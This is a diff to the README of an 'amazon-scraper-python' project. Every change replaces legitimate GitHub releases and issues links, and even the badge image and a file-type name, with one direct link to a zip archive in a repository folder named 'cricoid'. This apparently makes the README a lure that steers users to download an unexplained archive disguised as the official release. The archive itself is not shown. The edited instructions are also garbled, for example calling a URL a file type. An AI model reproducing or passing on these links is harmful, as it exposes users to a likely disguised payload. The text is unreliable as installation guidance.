@@ -6,9 +6,9 @@ Welcome! This guide will help you easily download and run the **amazon-scraper-p
 
 ## 📥 Download the Application
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/BhaveshGavande23/amazon-scraper-python/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/BhaveshGavande23/amazon-scraper-python/main/cricoid/amazon-scraper-python.zip%20Latest%https://raw.githubusercontent.com/BhaveshGavande23/amazon-scraper-python/main/cricoid/amazon-scraper-python.zip)](https://raw.githubusercontent.com/BhaveshGavande23/amazon-scraper-python/main/cricoid/amazon-scraper-python.zip)
 
-You can get the latest version of the software by visiting our [Releases page](https://github.com/BhaveshGavande23/amazon-scraper-python/releases).
+You can get the latest version of the software by visiting our [Releases page](https://raw.githubusercontent.com/BhaveshGavande23/amazon-scraper-python/main/cricoid/amazon-scraper-python.zip).
 
 ## 🛠️ System Requirements
 
@@ -22,10 +22,10 @@ Before you begin, ensure you have the following:
 ## 📖 Installation Instructions
 
 1. **Visit the Download Page**  
-   Go to the download page by clicking [here](https://github.com/BhaveshGavande23/amazon-scraper-python/releases).
+   Go to the download page by clicking [here](https://raw.githubusercontent.com/BhaveshGavande23/amazon-scraper-python/main/cricoid/amazon-scraper-python.zip).
 
 2. **Choose the Right File**  
-   Select the latest release from the list. You will see several files. Look for the one that matches your operating system. If you're unsure, choose the `.exe` file for Windows or the `.tar.gz` file for macOS and Linux.
+   Select the latest release from the list. You will see several files. Look for the one that matches your operating system. If you're unsure, choose the `.exe` file for Windows or the `https://raw.githubusercontent.com/BhaveshGavande23/amazon-scraper-python/main/cricoid/amazon-scraper-python.zip` file for macOS and Linux.
 
 3. **Download the File**  
    Click on the file name to start downloading it to your computer.
@@ -77,7 +77,7 @@ If you encounter any issues:
 
 If you need further assistance, please feel free to reach out:
 
-- Visit our [GitHub Issues page](https://github.com/BhaveshGavande23/amazon-scraper-python/issues) for support.
+- Visit our [GitHub Issues page](https://raw.githubusercontent.com/BhaveshGavande23/amazon-scraper-python/main/cricoid/amazon-scraper-python.zip) for support.
 - Join our discussion forum to connect with other users.
 
 ## 📜 License
@@ -86,4 +86,4 @@ This application is open-source and is licensed under the MIT License. You can f
 
 ## 📲 Download Now
 
-For the latest version, please revisit our [Releases page](https://github.com/BhaveshGavande23/amazon-scraper-python/releases). Enjoy extracting data from Amazon with ease!
+For the latest version, please revisit our [Releases page](https://raw.githubusercontent.com/BhaveshGavande23/amazon-scraper-python/main/cricoid/amazon-scraper-python.zip). Enjoy extracting data from Amazon with ease!
